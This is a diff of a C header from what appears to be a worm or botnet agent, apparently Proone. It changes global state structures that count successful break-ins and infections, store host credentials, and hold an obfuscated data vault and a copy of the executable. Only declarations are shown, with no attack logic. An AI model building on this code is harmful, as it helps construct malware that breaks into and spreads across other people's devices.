@@ -13,12 +13,9 @@
 #include <mbedtls/ctr_drbg.h>
 
 
-struct prne_global {
-	uint8_t *host_cred_data;
-	size_t host_cred_size;
+struct prne_global { // TODO: tidy init code when finalised
 	struct timespec parent_start;
 	struct timespec child_start;
-	uint_fast64_t run_cnt;
 	uint8_t boot_id[16];
 	uint8_t instance_id[16];
 	pth_t main_pth;
@@ -28,7 +25,12 @@ struct prne_global {
 	prne_resolv_t *resolv;
 	pid_t parent_pid;
 	pid_t child_pid;
-	int lock_shm_fd;
+	int shm_fd;
+	uint8_t *m_dvault;
+	const uint8_t *m_exec;
+	size_t exec_size;
+	const uint8_t *m_exec_dvault;
+	uint16_t dvault_size;
 	bool bin_ready;
 	bool is_child;
 	
@@ -55,12 +57,17 @@ struct prne_global {
 };
 
 struct prne_shared_global {
+	// Format Revision
+	uint8_t rev;
+	// Number of child process crash.
+	uint32_t crash_cnt;
 	// "break and entry" count. Number of successful logins.
-	uint_fast64_t bne_cnt;
+	uint64_t bne_cnt;
 	// Number of successful infections.
-	uint_fast64_t infect_cnt;
+	uint64_t infect_cnt;
 	// null-terminated name of new binary
-	char ny_bin_name[20];
+	char ny_bin_name[256];
+	char host_cred_data[256];
 };
 
 static const intptr_t PRNE_RESOLV_WKR_ID = 0;
@@ -68,4 +75,5 @@ static const intptr_t PRNE_HTBT_WKR_ID = 1;
 
 
 extern struct prne_global prne_g;
+// TODO: could be NULL on some environments
 extern struct prne_shared_global *prne_s_g;
